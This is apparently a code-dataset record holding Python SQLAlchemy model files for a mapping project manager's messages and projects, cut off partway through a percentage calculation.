[{"id": "dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a", "code": "server/models/postgis/message.py/n/nfrom sqlalchemy import text\n\nfrom server import db\nfrom flask import current_app\nfrom enum import Enum\nfrom server.models.dtos.message_dto import MessageDTO, MessagesDTO\nfrom server.models.postgis.user import User\nfrom server.models.postgis.task import Task\nfrom server.models.postgis.project import Project\nfrom server.models.postgis.utils import timestamp\nfrom server.models.postgis.utils import NotFound\n\nclass MessageType(Enum):\n    \"\"\" Describes the various kinds of messages a user might receive \"\"\"\n    SYSTEM = 1                     # Generic system-generated message\n    BROADCAST = 2                  # Broadcast message from a project manager\n    MENTION_NOTIFICATION = 3       # Notification that user was mentioned in a comment/chat\n    VALIDATION_NOTIFICATION = 4    # Notification that user's mapped task was validated\n    INVALIDATION_NOTIFICATION = 5  # Notification that user's mapped task was invalidated\n\nclass Message(db.Model):\n    \"\"\" Describes an individual Message a user can send \"\"\"\n    __tablename__ = \"messages\"\n\n    __table_args__ = (\n        db.ForeignKeyConstraint(['task_id', 'project_id'], ['tasks.id', 'tasks.project_id']),\n    )\n\n    id = db.Column(db.Integer, primary_key=True)\n    message = db.Column(db.String)\n    subject = db.Column(db.String)\n    from_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'))\n    to_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'), index=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)\n    task_id = db.Column(db.Integer, index=True)\n    message_type = db.Column(db.Integer, index=True)\n    date = db.Column(db.DateTime, default=timestamp)\n    read = db.Column(db.Boolean, default=False)\n\n    # Relationships\n    from_user = db.relationship(User, foreign_keys=[from_user_id])\n    to_user = db.relationship(User, foreign_keys=[to_user_id], backref='messages')\n    project = db.relationship(Project, foreign_keys=[project_id], backref='messages')\n    task = db.relationship(Task, primaryjoin=\"and_(Task.id == foreign(Message.task_id), Task.project_id == Message.project_id)\",\n        backref='messages')\n\n    @classmethod\n    def from_dto(cls, to_user_id: int, dto: MessageDTO):\n        \"\"\" Creates new message from DTO \"\"\"\n        message = cls()\n        message.subject = dto.subject\n        message.message = dto.message\n        message.from_user_id = dto.from_user_id\n        message.to_user_id = to_user_id\n        message.project_id = dto.project_id\n        message.task_id = dto.task_id\n        if dto.message_type is not None:\n            message.message_type = MessageType(dto.message_type)\n\n        return message\n\n    def as_dto(self) -> MessageDTO:\n        \"\"\" Casts message object to DTO \"\"\"\n        dto = MessageDTO()\n        dto.message_id = self.id\n        dto.message = self.message\n        dto.sent_date = self.date\n        dto.read = self.read\n        dto.subject = self.subject\n        dto.project_id = self.project_id\n        dto.task_id = self.task_id\n        if self.message_type is not None:\n            dto.message_type = MessageType(self.message_type).name\n\n        if self.from_user_id:\n            dto.from_username = self.from_user.username\n\n        return dto\n\n    def add_message(self):\n        \"\"\" Add message into current transaction - DO NOT COMMIT HERE AS MESSAGES ARE PART OF LARGER TRANSACTIONS\"\"\"\n        current_app.logger.debug('Adding message to session')\n        db.session.add(self)\n\n    def save(self):\n        \"\"\" Save \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    @staticmethod\n    def get_all_contributors(project_id: int):\n        \"\"\" Get all contributors to a project \"\"\"\n        query = '''SELECT mapped_by as contributors from tasks where project_id = :project_id and mapped_by is not null\n                   UNION\n                   SELECT validated_by from tasks where tasks.project_id = :project_id and validated_by is not null'''\n\n        contributors = db.engine.execute(text(query), project_id=project_id)\n        return contributors\n\n    def mark_as_read(self):\n        \"\"\" Mark the message in scope as Read \"\"\"\n        self.read = True\n        db.session.commit()\n\n    @staticmethod\n    def get_unread_message_count(user_id: int):\n        \"\"\" Get count of unread messages for user \"\"\"\n        return Message.query.filter(Message.to_user_id == user_id, Message.read == False).count()\n\n    @staticmethod\n    def get_all_messages(user_id: int) -> MessagesDTO:\n        \"\"\" Gets all messages to the user \"\"\"\n        user_messages = Message.query.filter(Message.to_user_id == user_id).all()\n\n        if len(user_messages) == 0:\n            raise NotFound()\n\n        messages_dto = MessagesDTO()\n        for message in user_messages:\n            messages_dto.user_messages.append(message.as_dto())\n\n        return messages_dto\n\n    @staticmethod\n    def delete_multiple_messages(message_ids: list, user_id: int):\n        \"\"\" Deletes the specified messages to the user \"\"\"\n        Message.query.filter(Message.to_user_id == user_id, Message.id.in_(message_ids)).\\\n                delete(synchronize_session=False)\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n/n/n/nserver/models/postgis/project.py/n/nimport json\nimport re\nfrom typing import Optional\nfrom cachetools import TTLCache, cached\n\nimport geojson\nfrom flask import current_app\nfrom geoalchemy2 import Geometry\nfrom sqlalchemy import text\nfrom shapely.geometry import shape\nfrom sqlalchemy.dialects.postgresql import ARRAY\nfrom sqlalchemy.orm.session import make_transient\nfrom geoalchemy2.shape import to_shape\nfrom shapely.geometry import Polygon\nfrom shapely.ops import transform\nfrom functools import partial\nimport pyproj\nimport dateutil.parser\nimport datetime\n\nfrom server import db\nfrom server.models.dtos.project_dto import ProjectDTO, DraftProjectDTO, ProjectSummary, PMDashboardDTO, ProjectStatsDTO, ProjectUserStatsDTO\nfrom server.models.dtos.tags_dto import TagsDTO\nfrom server.models.postgis.priority_area import PriorityArea, project_priority_areas\nfrom server.models.postgis.project_info import ProjectInfo\nfrom server.models.postgis.project_chat import ProjectChat\nfrom server.models.postgis.statuses import ProjectStatus, ProjectPriority, MappingLevel, TaskStatus, MappingTypes, TaskCreationMode, Editors\nfrom server.models.postgis.tags import Tags\nfrom server.models.postgis.task import Task, TaskHistory\nfrom server.models.postgis.user import User\n\nfrom server.models.postgis.utils import ST_SetSRID, ST_GeomFromGeoJSON, timestamp, ST_Centroid, NotFound, ST_Area, ST_Transform\nfrom server.services.grid.grid_service import GridService\n\n# Secondary table defining many-to-many join for private projects that only defined users can map on\nproject_allowed_users = db.Table(\n    'project_allowed_users',\n    db.metadata,\n    db.Column('project_id', db.Integer, db.ForeignKey('projects.id')),\n    db.Column('user_id', db.BigInteger, db.ForeignKey('users.id'))\n)\n\n# cache mapper counts for 30 seconds\nactive_mappers_cache = TTLCache(maxsize=1024, ttl=30)\n\n\nclass Project(db.Model):\n    \"\"\" Describes a HOT Mapping Project \"\"\"\n    __tablename__ = 'projects'\n\n    # Columns\n    id = db.Column(db.Integer, primary_key=True)\n    status = db.Column(db.Integer, default=ProjectStatus.DRAFT.value, nullable=False)\n    created = db.Column(db.DateTime, default=timestamp, nullable=False)\n    priority = db.Column(db.Integer, default=ProjectPriority.MEDIUM.value)\n    default_locale = db.Column(db.String(10),\n                               default='en')  # The locale that is returned if requested locale not available\n    author_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users'), nullable=False)\n    mapper_level = db.Column(db.Integer, default=1, nullable=False, index=True)  # Mapper level project is suitable for\n    enforce_mapper_level = db.Column(db.Boolean, default=False)\n    enforce_validator_role = db.Column(db.Boolean, default=False)  # Means only users with validator role can validate\n    enforce_random_task_selection = db.Column(db.Boolean, default=False)  # Force users to edit at random to avoid mapping \"easy\" tasks\n    allow_non_beginners = db.Column(db.Boolean, default=False)\n    private = db.Column(db.Boolean, default=False)  # Only allowed users can validate\n    entities_to_map = db.Column(db.String)\n    changeset_comment = db.Column(db.String)\n    osmcha_filter_id = db.Column(db.String)  # Optional custom filter id for filtering on OSMCha\n    due_date = db.Column(db.DateTime)\n    imagery = db.Column(db.String)\n    josm_preset = db.Column(db.String)\n    last_updated = db.Column(db.DateTime, default=timestamp)\n    license_id = db.Column(db.Integer, db.ForeignKey('licenses.id', name='fk_licenses'))\n    geometry = db.Column(Geometry('MULTIPOLYGON', srid=4326))\n    centroid = db.Column(Geometry('POINT', srid=4326))\n    task_creation_mode = db.Column(db.Integer, default=TaskCreationMode.GRID.value, nullable=False)\n\n    # Tags\n    mapping_types = db.Column(ARRAY(db.Integer), index=True)\n    organisation_tag = db.Column(db.String, index=True)\n    campaign_tag = db.Column(db.String, index=True)\n\n    # Editors\n    mapping_editors = db.Column(ARRAY(db.Integer), default=[\n                                                            Editors.ID.value,\n                                                            Editors.JOSM.value,\n                                                            Editors.POTLATCH_2.value,\n                                                            Editors.FIELD_PAPERS.value],\n                                                            index=True, nullable=False)\n    validation_editors = db.Column(ARRAY(db.Integer), default=[\n                                                               Editors.ID.value,\n                                                               Editors.JOSM.value,\n                                                               Editors.POTLATCH_2.value,\n                                                               Editors.FIELD_PAPERS.value],\n                                                               index=True, nullable=False)\n\n    # Stats\n    total_tasks = db.Column(db.Integer, nullable=False)\n    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)\n    tasks_validated = db.Column(db.Integer, default=0, nullable=False)\n    tasks_bad_imagery = db.Column(db.Integer, default=0, nullable=False)\n\n    # Mapped Objects\n    tasks = db.relationship(Task, backref='projects', cascade=\"all, delete, delete-orphan\", lazy='dynamic')\n    project_info = db.relationship(ProjectInfo, lazy='dynamic', cascade='all')\n    project_chat = db.relationship(ProjectChat, lazy='dynamic', cascade='all')\n    author = db.relationship(User)\n    allowed_users = db.relationship(User, secondary=project_allowed_users)\n    priority_areas = db.relationship(PriorityArea, secondary=project_priority_areas, cascade=\"all, delete-orphan\",\n                                     single_parent=True)\n\n    def create_draft_project(self, draft_project_dto: DraftProjectDTO):\n        \"\"\"\n        Creates a draft project\n        :param draft_project_dto: DTO containing draft project details\n        :param aoi: Area of Interest for the project (eg boundary of project)\n        \"\"\"\n        self.project_info.append(ProjectInfo.create_from_name(draft_project_dto.project_name))\n        self.status = ProjectStatus.DRAFT.value\n        self.author_id = draft_project_dto.user_id\n        self.last_updated = timestamp()\n\n    def set_project_aoi(self, draft_project_dto: DraftProjectDTO):\n        \"\"\" Sets the AOI for the supplied project \"\"\"\n        aoi_geojson = geojson.loads(json.dumps(draft_project_dto.area_of_interest))\n\n        aoi_geometry = GridService.merge_to_multi_polygon(aoi_geojson, dissolve=True)\n\n        valid_geojson = geojson.dumps(aoi_geometry)\n        self.geometry = ST_SetSRID(ST_GeomFromGeoJSON(valid_geojson), 4326)\n        self.centroid = ST_Centroid(self.geometry)\n\n    def set_default_changeset_comment(self):\n        \"\"\" Sets the default changeset comment\"\"\"\n        default_comment = current_app.config['DEFAULT_CHANGESET_COMMENT']\n        self.changeset_comment = f'{default_comment}-{self.id} {self.changeset_comment}' if self.changeset_comment is not None else f'{default_comment}-{self.id}'\n        self.save()\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def save(self):\n        \"\"\" Save changes to db\"\"\"\n        db.session.commit()\n\n    @staticmethod\n    def clone(project_id: int, author_id: int):\n        \"\"\" Clone project \"\"\"\n\n        cloned_project = Project.get(project_id)\n\n        # Remove clone from session so we can reinsert it as a new object\n        db.session.expunge(cloned_project)\n        make_transient(cloned_project)\n\n        # Re-initialise counters and meta-data\n        cloned_project.total_tasks = 0\n        cloned_project.tasks_mapped = 0\n        cloned_project.tasks_validated = 0\n        cloned_project.tasks_bad_imagery = 0\n        cloned_project.last_updated = timestamp()\n        cloned_project.created = timestamp()\n        cloned_project.author_id = author_id\n        cloned_project.status = ProjectStatus.DRAFT.value\n        cloned_project.id = None  # Reset ID so we get a new ID when inserted\n        cloned_project.geometry = None\n        cloned_project.centroid = None\n\n        db.session.add(cloned_project)\n        db.session.commit()\n\n        # Now add the project info, we have to do it in a two stage commit because we need to know the new project id\n        original_project = Project.get(project_id)\n\n        for info in original_project.project_info:\n            db.session.expunge(info)\n            make_transient(info)  # Must remove the object from the session or it will be updated rather than inserted\n            info.id = None\n            info.project_id_str = str(cloned_project.id)\n            cloned_project.project_info.append(info)\n\n        # Now add allowed users now we know new project id, if there are any\n        for user in original_project.allowed_users:\n            cloned_project.allowed_users.append(user)\n\n        # Add other project metadata\n        cloned_project.priority = original_project.priority\n        cloned_project.default_locale = original_project.default_locale\n        cloned_project.mapper_level = original_project.mapper_level\n        cloned_project.enforce_mapper_level = original_project.enforce_mapper_level\n        cloned_project.enforce_validator_role = original_project.enforce_validator_role\n        cloned_project.enforce_random_task_selection = original_project.enforce_random_task_selection\n        cloned_project.private = original_project.private\n        cloned_project.entities_to_map = original_project.entities_to_map\n        cloned_project.due_date = original_project.due_date\n        cloned_project.imagery = original_project.imagery\n        cloned_project.josm_preset = original_project.josm_preset\n        cloned_project.license_id = original_project.license_id\n        cloned_project.mapping_types = original_project.mapping_types\n        cloned_project.organisation_tag = original_project.organisation_tag\n        cloned_project.campaign_tag = original_project.campaign_tag\n\n        # We try to remove the changeset comment referencing the old project. This\n        #  assumes the default changeset comment has not changed between the old\n        #  project and the cloned. This is a best effort basis.\n        default_comment = current_app.config['DEFAULT_CHANGESET_COMMENT']\n        changeset_comments = []\n        if original_project.changeset_comment is not None:\n            changeset_comments = original_project.changeset_comment.split(' ')\n        if f'{default_comment}-{original_project.id}' in changeset_comments:\n            changeset_comments.remove(f'{default_comment}-{original_project.id}')\n        cloned_project.changeset_comment = \" \".join(changeset_comments)\n\n        db.session.add(cloned_project)\n        db.session.commit()\n\n        return cloned_project\n\n    @staticmethod\n    def get(project_id: int):\n        \"\"\"\n        Gets specified project\n        :param project_id: project ID in scope\n        :return: Project if found otherwise None\n        \"\"\"\n        return Project.query.get(project_id)\n\n    def update(self, project_dto: ProjectDTO):\n        \"\"\" Updates project from DTO \"\"\"\n        self.status = ProjectStatus[project_dto.project_status].value\n        self.priority = ProjectPriority[project_dto.project_priority].value\n        self.default_locale = project_dto.default_locale\n        self.enforce_mapper_level = project_dto.enforce_mapper_level\n        self.enforce_validator_role = project_dto.enforce_validator_role\n        self.enforce_random_task_selection = project_dto.enforce_random_task_selection\n        self.allow_non_beginners = project_dto.allow_non_beginners\n        self.private = project_dto.private\n        self.mapper_level = MappingLevel[project_dto.mapper_level.upper()].value\n        self.entities_to_map = project_dto.entities_to_map\n        self.changeset_comment = project_dto.changeset_comment\n        self.due_date = project_dto.due_date\n        self.imagery = project_dto.imagery\n        self.josm_preset = project_dto.josm_preset\n        self.last_updated = timestamp()\n        self.license_id = project_dto.license_id\n\n        if project_dto.osmcha_filter_id:\n            # Support simple extraction of OSMCha filter id from OSMCha URL\n            match = re.search('aoi=([\\w-]+)', project_dto.osmcha_filter_id)\n            self.osmcha_filter_id = match.group(1) if match else project_dto.osmcha_filter_id\n        else:\n            self.osmcha_filter_id = None\n\n        if project_dto.organisation_tag:\n            org_tag = Tags.upsert_organistion_tag(project_dto.organisation_tag)\n            self.organisation_tag = org_tag\n        else:\n            self.organisation_tag = None  # Set to none, for cases where a tag could have been removed\n\n        if project_dto.campaign_tag:\n            camp_tag = Tags.upsert_campaign_tag(project_dto.campaign_tag)\n            self.campaign_tag = camp_tag\n        else:\n            self.campaign_tag = None  # Set to none, for cases where a tag could have been removed\n\n        # Cast MappingType strings to int array\n        type_array = []\n        for mapping_type in project_dto.mapping_types:\n            type_array.append(MappingTypes[mapping_type].value)\n        self.mapping_types = type_array\n\n        # Cast Editor strings to int array\n        mapping_editors_array = []\n        for mapping_editor in project_dto.mapping_editors:\n            mapping_editors_array.append(Editors[mapping_editor].value)\n        self.mapping_editors = mapping_editors_array\n\n        validation_editors_array = []\n        for validation_editor in project_dto.validation_editors:\n            validation_editors_array.append(Editors[validation_editor].value)\n        self.validation_editors = validation_editors_array\n\n        # Add list of allowed users, meaning the project can only be mapped by users in this list\n        if hasattr(project_dto, 'allowed_users'):\n            self.allowed_users = []  # Clear existing relationships then re-insert\n            for user in project_dto.allowed_users:\n                self.allowed_users.append(user)\n\n        # Set Project Info for all returned locales\n        for dto in project_dto.project_info_locales:\n\n            project_info = self.project_info.filter_by(locale=dto.locale).one_or_none()\n\n            if project_info is None:\n                new_info = ProjectInfo.create_from_dto(dto)  # Can't find info so must be new locale\n                self.project_info.append(new_info)\n            else:\n                project_info.update_from_dto(dto)\n\n        self.priority_areas = []  # Always clear Priority Area prior to updating\n        if project_dto.priority_areas:\n            for priority_area in project_dto.priority_areas:\n                pa = PriorityArea.from_dict(priority_area)\n                self.priority_areas.append(pa)\n\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def can_be_deleted(self) -> bool:\n        \"\"\" Projects can be deleted if they have no mapped work \"\"\"\n        task_count = self.tasks.filter(Task.task_status != TaskStatus.READY.value).count()\n        if task_count == 0:\n            return True\n        else:\n            return False\n\n    def get_locked_tasks_for_user(self, user_id: int):\n        \"\"\" Gets tasks on project owned by specified user id\"\"\"\n        tasks = self.tasks.filter_by(locked_by=user_id)\n\n        locked_tasks = []\n        for task in tasks:\n            locked_tasks.append(task.id)\n\n        return locked_tasks\n\n    def get_locked_tasks_details_for_user(self, user_id: int):\n        \"\"\" Gets tasks on project owned by specified user id\"\"\"\n        tasks = self.tasks.filter_by(locked_by=user_id)\n\n        locked_tasks = []\n        for task in tasks:\n            locked_tasks.append(task)\n\n        return locked_tasks\n\n    @staticmethod\n    def get_projects_for_admin(admin_id: int, preferred_locale: str) -> PMDashboardDTO:\n        \"\"\" Get projects for admin \"\"\"\n        admins_projects = Project.query.filter_by(author_id=admin_id).all()\n\n        if admins_projects is None:\n            raise NotFound('No projects found for admin')\n\n        admin_projects_dto = PMDashboardDTO()\n        for project in admins_projects:\n            pm_project = project.get_project_summary(preferred_locale)\n            project_status = ProjectStatus(project.status)\n\n            if project_status == ProjectStatus.DRAFT:\n                admin_projects_dto.draft_projects.append(pm_project)\n            elif project_status == ProjectStatus.PUBLISHED:\n                admin_projects_dto.active_projects.append(pm_project)\n            elif project_status == ProjectStatus.ARCHIVED:\n                admin_projects_dto.archived_projects.append(pm_project)\n            else:\n                current_app.logger.error(f'Unexpected state project {project.id}')\n\n        return admin_projects_dto\n\n    def get_project_user_stats(self, user_id: int) -> ProjectUserStatsDTO:\n        \"\"\"Compute project specific stats for a given user\"\"\"\n        stats_dto = ProjectUserStatsDTO()\n        stats_dto.time_spent_mapping = 0\n        stats_dto.time_spent_validating = 0\n        stats_dto.total_time_spent = 0\n\n        query = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                   WHERE action='LOCKED_FOR_MAPPING'\n                   and user_id = :user_id and project_id = :project_id;\"\"\"\n        total_mapping_time = db.engine.execute(text(query), user_id=user_id, project_id=self.id)\n        for time in total_mapping_time:\n            total_mapping_time = time[0]\n            if total_mapping_time:\n                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_mapping\n\n        query = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                   WHERE action='LOCKED_FOR_VALIDATION'\n                   and user_id = :user_id and project_id = :project_id;\"\"\"\n        total_validation_time = db.engine.execute(text(query), user_id=user_id, project_id=self.id)\n        for time in total_validation_time:\n            total_validation_time = time[0]\n            if total_validation_time:\n                stats_dto.time_spent_validating = total_validation_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_validating\n\n        return stats_dto\n\n    def get_project_stats(self) -> ProjectStatsDTO:\n        \"\"\" Create Project Summary model for postgis project object\"\"\"\n        project_stats = ProjectStatsDTO()\n        project_stats.project_id = self.id\n        polygon = to_shape(self.geometry)\n        polygon_aea = transform(\n                            partial(\n                            pyproj.transform,\n                            pyproj.Proj(init='EPSG:4326'),\n                            pyproj.Proj(\n                                proj='aea',\n                                lat1=polygon.bounds[1],\n                                lat2=polygon.bounds[3])),\n                            polygon)\n        area = polygon_aea.area/1000000\n        project_stats.area = area\n        project_stats.total_mappers = db.session.query(User).filter(User.projects_mapped.any(self.id)).count()\n        project_stats.total_tasks = self.total_tasks\n        project_stats.total_comments = db.session.query(ProjectChat).filter(ProjectChat.project_id == self.id).count()\n        project_stats.percent_mapped = Project.calculate_tasks_percent('mapped', self.total_tasks,\n                                                                       self.tasks_mapped, self.tasks_validated,\n                                                                       self.tasks_bad_imagery)\n        project_stats.percent_validated = Project.calculate_tasks_percent('validated', self.total_tasks,\n                                                                          self.tasks_mapped, self.tasks_validated,\n                                                                          self.tasks_bad_imagery)\n        project_stats.percent_bad_imagery = Project.calculate_tasks_percent('bad_imagery', self.total_tasks,\n                                                                            self.tasks_mapped, self.tasks_validated,\n                                                                            self.tasks_bad_imagery)\n        centroid_geojson = db.session.scalar(self.centroid.ST_AsGeoJSON())\n        project_stats.aoi_centroid = geojson.loads(centroid_geojson)\n        unique_mappers = TaskHistory.query.filter(\n                TaskHistory.action == 'LOCKED_FOR_MAPPING',\n                TaskHistory.project_id == self.id\n            ).distinct(TaskHistory.user_id).count()\n        unique_validators = TaskHistory.query.filter(\n                TaskHistory.action == 'LOCKED_FOR_VALIDATION',\n                TaskHistory.project_id == self.id\n            ).distinct(TaskHistory.user_id).count()\n        project_stats.total_time_spent = 0\n        project_stats.total_mapping_time = 0\n        project_stats.total_validation_time = 0\n        project_stats.average_mapping_time = 0\n        project_stats.average_validation_time = 0\n\n        query = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                   WHERE action='LOCKED_FOR_MAPPING' and project_id = :project_id;\"\"\"\n        total_mapping_time = db.engine.execute(text(query), project_id=self.id)\n        for row in total_mapping_time:\n            total_mapping_time = row[0]\n            if total_mapping_time:\n                total_mapping_seconds = total_mapping_time.total_seconds()\n                project_stats.total_mapping_time = total_mapping_seconds\n                project_stats.total_time_spent += project_stats.total_mapping_time\n                if unique_mappers:\n                    average_mapping_time = total_mapping_seconds/unique_mappers\n                    project_stats.average_mapping_time = average_mapping_time\n\n        query = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                   WHERE action='LOCKED_FOR_VALIDATION' and project_id = :project_id;\"\"\"\n        total_validation_time = db.engine.execute(text(query), project_id=self.id)\n        for row in total_validation_time:\n            total_validation_time = row[0]\n            if total_validation_time:\n                total_validation_seconds = total_validation_time.total_seconds()\n                project_stats.total_validation_time = total_validation_seconds\n                project_stats.total_time_spent += project_stats.total_validation_time\n                if unique_validators:\n                    average_validation_time = total_validation_seconds/unique_validators\n                    project_stats.average_validation_time = average_validation_time\n\n        return project_stats\n\n    def get_project_summary(self, preferred_locale) -> ProjectSummary:\n        \"\"\" Create Project Summary model for postgis project object\"\"\"\n        summary = ProjectSummary()\n        summary.project_id = self.id\n        priority = self.priority\n        if priority == 0:\n            summary.priority = 'URGENT'\n        elif priority == 1:\n            summary.priority = 'HIGH'\n        elif priority == 2:\n            summary.priority = 'MEDIUM'\n        else:\n            summary.priority = 'LOW'\n        summary.author = User().get_by_id(self.author_id).username\n        polygon = to_shape(self.geometry)\n        polygon_aea = transform(\n                            partial(\n                            pyproj.transform,\n                            pyproj.Proj(init='EPSG:4326'),\n                            pyproj.Proj(\n                                proj='aea',\n                                lat1=polygon.bounds[1],\n                                lat2=polygon.bounds[3])),\n                            polygon)\n        area = polygon_aea.area/1000000\n        summary.area = area\n        summary.campaign_tag = self.campaign_tag\n        summary.changeset_comment = self.changeset_comment\n        summary.created = self.created\n        summary.last_updated = self.last_updated\n        summary.due_date = self.due_date\n        summary.mapper_level = MappingLevel(self.mapper_level).name\n        summary.mapper_level_enforced = self.enforce_mapper_level\n        summary.validator_level_enforced = self.enforce_validator_role\n        summary.organisation_tag = self.organisation_tag\n        summary.status = ProjectStatus(self.status).name\n        summary.entities_to_map = self.entities_to_map\n\n        centroid_geojson = db.session.scalar(self.centroid.ST_AsGeoJSON())\n        summary.aoi_centroid = geojson.loads(centroid_geojson)\n\n        summary.percent_mapped = Project.calculate_tasks_percent('mapped', self.total_tasks,\n                                                                 self.tasks_mapped, self.tasks_validated,\n                                                                 self.tasks_bad_imagery)\n        summary.percent_validated = Project.calculate_tasks_percent('validated', self.total_tasks,\n                                                                    self.tasks_mapped, self.tasks_validated,\n                                                                    self.tasks_bad_imagery)\n        summary.percent_bad_imagery = Project.calculate_tasks_percent('bad_imagery', self.total_tasks,\n                                                                      self.tasks_mapped, self.tasks_validated,\n                                                                      self.tasks_bad_imagery)\n\n        project_info = ProjectInfo.get_dto_for_locale(self.id, preferred_locale, self.default_locale)\n        summary.name = project_info.name\n        summary.short_description = project_info.short_description\n\n        return summary\n\n    def get_project_title(self, preferred_locale):\n        project_info = ProjectInfo.get_dto_for_locale(self.id, preferred_locale, self.default_locale)\n        return project_info.name\n\n    def get_aoi_geometry_as_geojson(self):\n        \"\"\" Helper which returns the AOI geometry as a geojson object \"\"\"\n        aoi_geojson = db.engine.execute(self.geometry.ST_AsGeoJSON()).scalar()\n        return geojson.loads(aoi_geojson)\n\n    @staticmethod\n    @cached(active_mappers_cache)\n    def get_active_mappers(project_id) -> int:\n        \"\"\" Get count of Locked tasks as a proxy for users who are currently active on the project \"\"\"\n\n        return Task.query \\\n            .filter(Task.task_status.in_((TaskStatus.LOCKED_FOR_MAPPING.value,\n                    TaskStatus.LOCKED_FOR_VALIDATION.value))) \\\n            .filter(Task.project_id == project_id) \\\n            .distinct(Task.locked_by) \\\n            .count()\n\n    def _get_project_and_base_dto(self):\n        \"\"\" Populates a project DTO with properties common to all roles \"\"\"\n        base_dto = ProjectDTO()\n        base_dto.project_id = self.id\n        base_dto.project_status = ProjectStatus(self.status).name\n        base_dto.default_locale = self.default_locale\n        base_dto.project_priority = ProjectPriority(self.priority).name\n        base_dto.area_of_interest = self.get_aoi_geometry_as_geojson()\n        base_dto.aoi_bbox = shape(base_dto.area_of_interest).bounds\n        base_dto.enforce_mapper_level = self.enforce_mapper_level\n        base_dto.enforce_validator_role = self.enforce_validator_role\n        base_dto.enforce_random_task_selection = self.enforce_random_task_selection\n        base_dto.allow_non_beginners = self.allow_non_beginners\n        base_dto.private = self.private\n        base_dto.mapper_level = MappingLevel(self.mapper_level).name\n        base_dto.entities_to_map = self.entities_to_map\n        base_dto.changeset_comment = self.changeset_comment\n        base_dto.osmcha_filter_id = self.osmcha_filter_id\n        base_dto.due_date = self.due_date\n        base_dto.imagery = self.imagery\n        base_dto.josm_preset = self.josm_preset\n        base_dto.campaign_tag = self.campaign_tag\n        base_dto.organisation_tag = self.organisation_tag\n        base_dto.license_id = self.license_id\n        base_dto.created = self.created\n        base_dto.last_updated = self.last_updated\n        base_dto.author = User().get_by_id(self.author_id).username\n        base_dto.active_mappers = Project.get_active_mappers(self.id)\n        base_dto.task_creation_mode = TaskCreationMode(self.task_creation_mode).name\n\n        if self.private:\n            # If project is private it should have a list of allowed users\n            allowed_usernames = []\n            for user in self.allowed_users:\n                allowed_usernames.append(user.username)\n            base_dto.allowed_usernames = allowed_usernames\n\n        if self.mapping_types:\n            mapping_types = []\n            for mapping_type in self.mapping_types:\n                mapping_types.append(MappingTypes(mapping_type).name)\n\n            base_dto.mapping_types = mapping_types\n\n        if self.mapping_editors:\n            mapping_editors = []\n            for mapping_editor in self.mapping_editors:\n                mapping_editors.append(Editors(mapping_editor).name)\n\n            base_dto.mapping_editors = mapping_editors\n\n        if self.validation_editors:\n            validation_editors = []\n            for validation_editor in self.validation_editors:\n                validation_editors.append(Editors(validation_editor).name)\n\n            base_dto.validation_editors = validation_editors\n\n        if self.priority_areas:\n            geojson_areas = []\n            for priority_area in self.priority_areas:\n                geojson_areas.append(priority_area.get_as_geojson())\n\n            base_dto.priority_areas = geojson_areas\n\n        return self, base_dto\n\n    def as_dto_for_mapping(self, locale: str, abbrev: bool) -> Optional[ProjectDTO]:\n        \"\"\" Creates a Project DTO suitable for transmitting to mapper users \"\"\"\n        project, project_dto = self._get_project_and_base_dto()\n\n        if abbrev == False:\n            project_dto.tasks = Task.get_tasks_as_geojson_feature_collection(self.id)\n        else:\n            project_dto.tasks = Task.get_tasks_as_geojson_feature_collection_no_geom(self.id)\n        project_dto.project_info = ProjectInfo.get_dto_for_locale(self.id, locale, project.default_locale)\n\n        return project_dto\n\n    def all_tasks_as_geojson(self):\n        \"\"\" Creates a geojson of all areas \"\"\"\n        project_tasks = Task.get_tasks_as_geojson_feature_collection(self.id)\n\n        return project_tasks\n\n    @staticmethod\n    def get_all_organisations_tag(preferred_locale='en'):\n        query = db.session.query(Project.id,\n                                 Project.organisation_tag,\n                                 Project.private,\n                                 Project.status)\\\n            .join(ProjectInfo)\\\n            .filter(ProjectInfo.locale.in_([preferred_locale, 'en'])) \\\n            .filter(Project.private != True)\\\n            .filter(Project.organisation_tag.isnot(None))\\\n            .filter(Project.organisation_tag != '')\n        query = query.distinct(Project.organisation_tag)\n        query = query.order_by(Project.organisation_tag)\n        tags_dto = TagsDTO()\n        tags_dto.tags = [r[1] for r in query]\n        return tags_dto\n\n    @staticmethod\n    def get_all_campaign_tag(preferred_locale='en'):\n        query = db.session.query(Project.id,\n                                 Project.campaign_tag,\n                                 Project.private,\n                                 Project.status)\\\n            .join(ProjectInfo)\\\n            .filter(ProjectInfo.locale.in_([preferred_locale, 'en'])) \\\n            .filter(Project.private != True)\\\n            .filter(Project.campaign_tag.isnot(None))\\\n            .filter(Project.campaign_tag != '')\n        query = query.distinct(Project.campaign_tag)\n        query = query.order_by(Project.campaign_tag)\n        tags_dto = TagsDTO()\n        tags_dto.tags = [r[1] for r in query]\n        return tags_dto\n\n    @staticmethod\n    def calculate_tasks_percent(target, total_tasks, tasks_mapped, tasks_validated, tasks_bad_imagery):\n        \"\"\" Calculates percentages of contributions \"\"\"\n        if target == 'mapped':\n            return int((tasks_mapped + tasks_validated) / (total_tasks - tasks_bad_imagery) * 100)\n        elif target == 'validated':\n            return int(tasks_validated / (total_tasks - tasks_bad_imagery) * 100)\n        elif target == 'bad_imagery':\n            return int((tasks_bad_imagery / 